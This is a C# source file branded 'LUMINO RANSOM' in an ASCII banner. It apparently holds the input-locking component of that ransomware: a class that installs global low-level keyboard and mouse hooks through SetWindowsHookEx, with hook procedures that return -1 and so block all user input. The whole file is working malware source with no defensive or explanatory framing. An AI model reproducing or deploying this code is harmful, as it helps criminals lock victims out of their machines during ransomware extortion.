/*





L)        U)    uu   M)mm mmm   I)iiii  N)n   nn   O)oooo        R)rrrrr     A)aa    N)n   nn   S)ssss    O)oooo    M)mm mmm  
L)        U)    uu  M)  mm  mm    I)    N)nn  nn  O)    oo       R)    rr   A)  aa   N)nn  nn  S)    ss  O)    oo  M)  mm  mm 
L)        U)    uu  M)  mm  mm    I)    N) nn nn  O)    oo       R)  rrr   A)    aa  N) nn nn   S)ss     O)    oo  M)  mm  mm 
L)        U)    uu  M)  mm  mm    I)    N)  nnnn  O)    oo       R) rr     A)aaaaaa  N)  nnnn       S)   O)    oo  M)  mm  mm 
L)        U)    uu  M)      mm    I)    N)   nnn  O)    oo       R)   rr   A)    aa  N)   nnn  S)    ss  O)    oo  M)      mm 
L)llllll   U)uuuu   M)      mm  I)iiii  N)    nn   O)oooo        R)    rr  A)    aa  N)    nn   S)ssss    O)oooo   M)      mm 
                                                                                                                    
     __ __             __     
    /\ \\ \          /'__`\   
    \ \ \\ \        /\ \/\ \  
     \ \ \\ \_      \ \ \ \ \ 
      \ \__ ,__\ __  \ \ \_\ \
       \/_/\_\_//\_\  \ \____/
          \/_/  \/_/   \/___/ 
              




*/
using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Reflection;

namespace GlobalHook
{

    public class UserActivityHook
    {
        private int _hMouseHook = 0;
        private int _hKeyboardHook = 0;
        private static HookProc MouseHookProcedure = null;
        private static HookProc KeyboardHookProcedure = null;

        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall, SetLastError = true)]
        private static extern int SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, int dwThreadId);


        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall, SetLastError = true)]
        private static extern int UnhookWindowsHookEx(int idHook);

        private delegate int HookProc(int nCode, int wParam, IntPtr lParam);


        private const int WH_MOUSE_LL = 14;

        private const int WH_KEYBOARD_LL = 13;


        public void Start_key()
        {
            KeyboardHookProcedure = new HookProc(KeyboardHookProc);
            this._hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProcedure, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]), 0);
        }
        public void Start_mouse()
        {
            MouseHookProcedure = new HookProc(MouseHookProc);
            this._hMouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseHookProcedure, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]), 0);
        }


        public void Stop_key()
        {
            this.Stop_key(true, true);
        }
        public void Stop_mouse()
        {
            this.Stop_mouse(true, true);
        }
        public void Stop_mouse(bool uninstallMouseHook, bool throwExceptions)
        {
                int retMouse = UnhookWindowsHookEx(this._hMouseHook);
                this._hMouseHook = 0;
            
        }

        public void Stop_key(bool uninstallKeyboardHook, bool throwExceptions)
        {
            int retKeyboard = UnhookWindowsHookEx(this._hKeyboardHook);
            this._hKeyboardHook = 0;
        }


        private int MouseHookProc(int nCode, int wParam, IntPtr lParam)
        {
            return -1;
        }

        private int KeyboardHookProc(int nCode, Int32 wParam, IntPtr lParam)
        {
            return -1;
        }
    }
}